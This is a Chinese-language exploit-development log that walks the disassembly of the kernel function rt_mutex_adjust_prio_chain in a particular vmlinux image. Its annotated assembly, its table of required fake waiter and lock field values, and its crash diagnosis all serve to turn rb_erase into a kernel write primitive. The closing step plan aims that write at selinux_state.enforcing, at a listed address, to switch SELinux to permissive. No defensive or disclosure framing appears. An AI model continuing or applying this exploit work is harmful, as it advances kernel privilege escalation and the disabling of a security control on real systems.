# H236 · `rt_mutex_adjust_prio_chain` 逐条读穿（离线，零开火）

> 依据：`analysis/vmlinux/vmlinux-mey.elf` 反汇编一手（capstone，576 条指令全解码）
> 工具：`analysis/scratch/h236_chain_readthrough.py`
> 目的：定位「写点门控之后」哪一条解引用被伪结构打空（5 次同签名 `page_request` 的根因）

---

## §0 结论速览

| # | 结论 | 强度 |
|---|---|---|
| 1 | **写原语只在 `tree.prio != task->prio` 分支上** | ★★★ 汇编实证 |
| 2 | **`tree.prio == task->prio` 走干净出口 `0x81980`，跳过 `rb_erase`** ⇒ 与目标矛盾 | ★★★ 汇编实证 |
| 3 | **唯一干净出口 = `0x81980`**（`_raw_spin_unlock_irq(task+0x90c)` → 正常返回） | ★★★ |
| 4 | 走写路径后**必须满足一组隐含约束**（见 §3），其中一条仍被我的伪结构打空 | ★★★ 已收窄到 20 条指令窗口 |
| 5 | 需要 `owner` 为**真实 task_struct**（`pi_waiters` 走树 + `pi_blocked_on` 可能被解引用） | ★★★ |

---

## §1 函数入口与参数

```
rt_mutex_adjust_prio_chain @ 0xffffffc0810815d4   长度 0x900（下一符号 rt_mutex_slowlock @ 0x…1ed4）
```
源码签名（本项目 refs 内 6.6 源码树）：
```c
rt_mutex_adjust_prio_chain(struct task_struct *task, enum rtmutex_chainwalk chwalk,
                           struct rt_mutex_base *lock, struct rt_mutex_waiter *orig_waiter,
                           struct rt_mutex_waiter *top_waiter)
```
⇒ `x0=task(x19)`、`x1=chwalk(x23)`、`x2=lock`、`x3=orig_waiter`、`x5=top_waiter`

---

## §2 ★★★ 关键结构：写原语所在的两条分支

### 2.1 早退闸门（决定走不走写）

```asm
81660: ldr  x8, [x25, #0x58]        ; x25 = waiter ; x8 = waiter->lock
81664: cmp  x27, x8                 ; x27 = 链的 lock 实参
81668: b.ne #0x81980                ; ★ lock 不等 ⇒ 干净出口（不写）

816b4: ldr  w9, [x25, #0x18]        ; ★ waiter->tree.prio
816b0: ldr  w8, [x19, #0x84]        ; ★ task->prio
816b8: cmp  w9, w8
816bc: b.eq #0x816e0                ; ★★ 相等 ⇒ 走「无变更」分支
```

### 2.2 ★★★ `tree.prio == task->prio` ⇒ 干净出口，**跳过写**

```asm
816e0: tbnz w8, #0x1f, #0x81d78     ; prio < 0 ⇒ 另一出口
816e4: mov  w8, #1
816f8: b.eq #0x816c0                ; 回到 trylock（继续循环，不写）
81700: b    #0x81980                ; ★★★ 干净出口
```

### 2.3 ★★★ `tree.prio != task->prio` ⇒ 走写路径

```asm
816c0: ldr  x24, [x25, #0x58]       ; x24 = lock = waiter->lock
816c8: bl   _raw_spin_trylock       ; trylock(&lock->wait_lock)
816cc: cbnz w0, #0x81704           ; 成功 ⇒ 继续

81704: cmp  x24, x21                ; …检查（x21 与锁相关）
8170c: ldr  x8, [x24, #0x18]        ; ★★★ lock->owner —— 必须可读（h234 的 owner=0 崩点）
81714: and  x8, x8, #0xfffffffffffffffe
81718: cmp  x8, x9                  ; 与 top_waiter 比较

81724: ldr  x27, [x24, #0x10]       ; ★ lock->waiters.rb_leftmost
81744: cmp  x27, x25                ; 与 waiter 比较
81748: b.ne #0x81758                ; 不等 ⇒ 跳过 rb_erase（写不发生！）

8174c: mov  x0, x25  ; bl rb_next
81754: str  x0, [x24, #0x10]
81758: add  x1, x24, #8             ; x1 = lock+8 = &lock->waiters.rb_root
8175c: mov  x0, x25
81760: bl   rb_erase                ; ★★★★★ 写原语执行点
81764: str  x25, [x25]              ; RB_CLEAR_NODE
```

### 2.4 ★ 写点之后的**必过解引用**（崩溃都在这里）

```asm
8177c: ldr  w8,  [x19, #0x84]       ; task->prio（安全）
81788: ldr  x9,  [x19, #0x298]      ; task+0x298（安全）
8178c: str  x9,  [x25, #0x20]
81790: ldr  x13, [x1, #8]!          ; ★ [lock+0x10] 再读
81794: cbnz x13, #0x81a8c           ; 非 0 ⇒ 进入更深的 walk

81a8c: …                            ; ★★ 更深 walk（疑似崩溃窗口）
81a90: ldr  w12, [x13, #0x18]
81aa4: ldr  x13, [x12]
81ac8: str  x25, [x12]

81aec: ldr  x8,  [x25, #0x28]!      ; ★ waiter->pi_tree.rb_parent_color
81af8: ldr  x8,  [x19, #0x928]      ; ★ task->pi_waiters.rb_leftmost
81b0c: str  x0,  [x19, #0x928]
81b1c: str  x25, [x25]

818a0: ldr  x8,  [x27]              ; ★ [lock->rb_leftmost]
818a8: ldr  x8,  [x19, #0x928]
818ac: ldr  x1,  [x8, #0x28]        ; ★★★ [px8+0x28] —— 若 x8=0 ⇒ 访问 0x28 ⇒ page_request！
```

---

## §3 ★★★ 硬约束表（伪 waiter / 伪 lock 必须满足）

| # | 字段 | 必须值 | 依据 | 我上一发的值 |
|---|---|---|---|---|
| 1 | `waiter->lock`(+0x58) | == 链的 lock 实参，且非 0 可读 | `81660/81664` | ✅ `S−0x260` |
| 2 | `waiter->tree.prio`(+0x18) | **≠ `task->prio`**（否则走干净出口，不写） | `816b8/816bc` | ✅ 1 |
| 3 | `lock->wait_lock`(+0x00) | 0（未持锁，trylock 才能成功） | `816c8` | ✅ 0 |
| 4 | `lock->owner`(+0x18) | **可读**；建议真实 task_struct | `8170c` | ⚠️ `init_task`（但仍有崩） |
| 5 | `lock->waiters.rb_leftmost`(+0x10) | **== waiter**（否则跳过 rb_erase） | `81744/81748` | ✅ 已设 |
| 6 | `waiter->tree.__rb_parent_color`(+0x00) | == `TARGET−8`（决定写目标） | `81760` 内 | ✅ |
| 7 | `waiter->tree.rb_right`(+0x08) | 0（跳过写点②） | — | ✅ |
| 8 | `waiter->tree.rb_left`(+0x10) | 0（Path 选择） | — | ✅ |
| 9 | `waiter->pi_tree.*`(+0x28) | ★ **未核对** —— `81aec` 会读它 | `81aec` | ⚠️ 全 0 |
| 10 | `owner->pi_waiters`(+0x920/0x928) | ★ 走树用；`init_task` 为 0 ⇒ 可能进 `818ac` 解引用 | `818a0-818ac` | ⚠️ 未核对 |
| 11 | `x8` 在 `818ac` 处 | ★ **`[x8+0x28]` 若 x8=0 ⇒ 访问 0x28 ⇒ `page_request`** ← **最可疑崩点** | `818ac` | — |

---

## §4 ★ 修正后的判断

1. **`tree.prio` 不能设成「等于 task->prio」** —— 那条路是干净出口但**不执行写**。
   ⇒ 必须让它不等，从而进入写路径 —— 这也正是所有崩溃发生的地方。
2. **`owner = init_task` 不够**：`init_task->pi_waiters` 为空会让流程落到 `818a0-818ac`，
   那里 `ldr x1, [x8, #0x28]` 在 `x8 = 0`（空树）时访问地址 `0x28` ⇒ **`page_request`**。
   ⇒ 需要 `owner` 的 `pi_waiters` 结构**非空且自洽**，或让 `x13 == 0` 走另一条出口。
3. **`81790: ldr x13, [x1, #8]!`** 是分水岭：
   - `x13 == 0` ⇒ 落 `81798: stp xzr,xzr,[x25,#8]` → `8179c/817a0/817a4` → 可能干净收尾；
   - `x13 != 0` ⇒ 跳 `81a8c` 进入更深 walk（崩溃集中区）。
   ⇒ ★ **让 `[lock+0x10]`（即 `rb_leftmost`）在被 `81754 str` 写后为 0**，
   可能是**最省事的干净路径**：即 `rb_next(waiter)` 返回 0。
   而 `rb_next` 在单节点树里返回 0 ⇒ **只要伪 lock 的树里只有 waiter 一个节点**，
   `81754` 就会把 `rb_leftmost = 0`，随后 `81790` 读到 0 ⇒ 走 `81798` 分支。

⇒ ★★★ **下一发的具体改法**：保持 §3 的 1–8，另外
   - 让 `waiter->tree.rb_right = 0`、`rb_left = 0`（已满足）⇒ `rb_next` 返回 0；
   - `owner` 仍用 `init_task`（或任意合法 task）—— 因为走 `81798` 分支后不再需要 `pi_waiters` 走树。

---

## §4b ★★★ 写点之后的真实流程（关键结构）

```
81760: bl rb_erase            ← ★ 写原语执行（*(TARGET)=0）
81764: str x25, [x25]         ; RB_CLEAR_NODE

8177c: ldr w8, [x19, #0x84]   ; task->prio（安全）
81788: ldr x9, [x19, #0x298]  ; task+0x298（安全）
81790: ldr x13, [x1, #8]!     ; ★ x1 = lock+8 ⇒ 读 [lock+0x10] = rb_leftmost
81794: cbnz x13, #0x81a8c     ; 非 0 ⇒ 走「重新入树」长路（崩溃集中区）

── x13 == 0 时的最短路径（仅 4 条，非常干净）──
81798: stp xzr, xzr, [x25, #8]  ; 清 waiter 的 rb_right/rb_left
8179c: str xzr, [x25]           ; 清 parent_color（把刚才的 TARGET−8 抹掉）
817a0: str x25, [x1]            ; [lock+0x10] = waiter（把节点重新挂回树）
817a4: str x25, [x24, #0x10]    ; [lock+0x10] = waiter（同上）
817a8: bl  rb_insert_color      ; ★ 重新插入 → 单节点树，无旋转
817b4: bl  _raw_spin_unlock
817b8: add x0, x19, #0x40
817bc: b   #0x81d04             ; ★★ 出口
```

### ★ 由此得到的「最短干净收尾」条件

`rb_next(waiter)` 在 `8174c` 被调用并把返回值写入 `[lock+0x10]`（`81754`）。
**若 waiter 的 `tree` 只有它一个节点（`rb_right = rb_left = 0`），`rb_next` 返回 0**
⇒ `81790` 读到 `x13 = 0` ⇒ 走上面那条 **4 条指令的极短路径** ⇒ 直接出口。

⇒ ★★★ **我的伪 waiter 已经满足 `rb_right = rb_left = 0`，理论上应走这条短路径。**
⇒ 但实测仍 panic ⇒ **说明在到达 `81790` 之前就已经崩了**，即崩点位于 **`81708`–`81790`** 之间：

| 地址 | 指令 | 依赖 | 风险 |
|---|---|---|---|
| `8170c` | `ldr x8, [x24, #0x18]` | `lock->owner` | owner=0 时读 `[0x18]` ⇒ **`page_request`** ✅ 与实测签名一致 |
| `81724` | `ldr x27, [x24, #0x10]` | `lock->rb_leftmost` | 已设 = waiter（栈地址，映射） |
| `8172c` | `ldr x8, [x27, #0x58]` | ★ **`x27+0x58`** = `(lock->rb_leftmost)+0x58` | 已设 rb_leftmost=waiter ⇒ 读 waiter+0x58（映射） |
| `81738` | `ldr x8, [x25]` | waiter->parent_color | 映射 |

⇒ ★★★ **最可能崩点 = `8170c` 的 `lock->owner` 解引用**（h234 设 `owner=0` ⇒ 读地址 `0x18` ⇒ `page_request`，
**与 `reason [page_request]` 完全吻合**）。

**但 h235 设了 `owner = init_task` 后仍崩** ⇒ 崩点转移到**其后的 `8172c`**：
`x27 = lock->rb_leftmost`（我设 = waiter 栈地址）⇒ `x27+0x58` 读到的是 **waiter 自己的 `lock` 字段**，
其值是 `S−0x260`（映射）⇒ 不崩。

⇒ 那么 h235 的崩点应在 **`81718` 之后的 `81744`→`81758`→`81760` 段**，或
**`81790` 之后**（若 `rb_next` 实际未返回 0）。

### ★★ 结论：崩点已收敛到 `81704`–`81760` 与 `81790` 之后两段，需各设一次「分段护栏」再打

---

## §5 下一步（一次一变量，且必须先加护栏）

| 步 | 改动 | 预期 |
|---|---|---|
| **D-2** | `waiter->tree.prio` 设成 **== `task->prio`** ⇒ 走 `0x816e0` → `0x81980` 干净出口 | **必不崩**（验证画布与悬垂链路本身正确；此发不写，只验通路） |
| **D-3** | 回到 `prio != task->prio`，但 `owner` 设为**指向自己内核栈上一个已知为 0 的 8 字节**（或 `owner=0` 以外的合法值） | 逐段收敛 |
| **E** | 目标改 `selinux_state.enforcing`（`0xffffffc0823ba418`，slide=0） | `getenforce` 变 Permissive |

★ **D-2 是零风险且信息量最大的一发**：
它把「画布+悬垂」与「写路径」解耦 —— 若 D-2 不崩，则证明**投递与悬垂全对**，
崩溃 100% 属于写路径的隐含约束；若 D-2 也崩，则问题在投递/悬垂侧。
